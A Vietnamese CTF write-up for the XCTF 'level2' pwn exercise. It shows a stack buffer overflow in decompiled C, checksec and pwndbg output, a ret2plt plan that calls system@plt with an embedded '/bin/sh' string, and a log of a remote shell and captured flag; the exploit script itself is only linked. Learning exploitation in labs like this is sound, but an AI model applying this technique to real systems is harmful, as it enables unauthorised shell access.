# XCTF - PWN Exercise - level2

```c
#include<stdio.h>

ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  system("echo Input:");
  return read(0, buf, 0x100u);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  system("echo 'Hello World!'");
  return 0;
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/1_level2 λ checksec level2   
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/1_level2/level2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Hàm `read()` cho nhập 0x100 = 256 mà buf[136] nên có thể buffer overflow, không có hàm giúp đọc flag hay thực thi shellcode. Ý tưởng là do hàm `system()` được gọi đến nên có `system@plt` nên chỉ cần đi đè địa chỉ trả về bằng địa chỉ của `system@plt` là có thể thực thi shell. Vấn đề là ta còn thiếu chuỗi `/bin/sh` làm đối số.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/1_level2 λ strings -a -tx level2 | grep /bin/sh
   1024 /bin/sh
```

Tôi tìm thấy trong file có sẵn chuỗi `/bin/sh` và offset của nó là `0x1024`. Ta dễ dàng tìm được địa chỉ của chuỗi `/bin/sh`.

```
pwndbg> x/10s 0x0804A024
0x804a024 <hint>:	"/bin/sh"
0x804a02c <completed.7181>:	""
0x804a02d:	""
0x804a02e:	""
0x804a02f:	""
0x804a030:	<error: Cannot access memory at address 0x804a030>
0x804a030:	<error: Cannot access memory at address 0x804a030>
0x804a030:	<error: Cannot access memory at address 0x804a030>
0x804a030:	<error: Cannot access memory at address 0x804a030>
0x804a030:	<error: Cannot access memory at address 0x804a030>
```

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/1_level2 λ python2 exploit.py 
[+] Opening connection to 111.200.241.244 on port 63253: Done
[*] Switching to interactive mode
$ ls
bin
dev
flag
level2
lib
lib32
lib64
$ cat flag
cyberpeace{a47dd0c3f651ec778da26ae79c5c255a}
$  
```
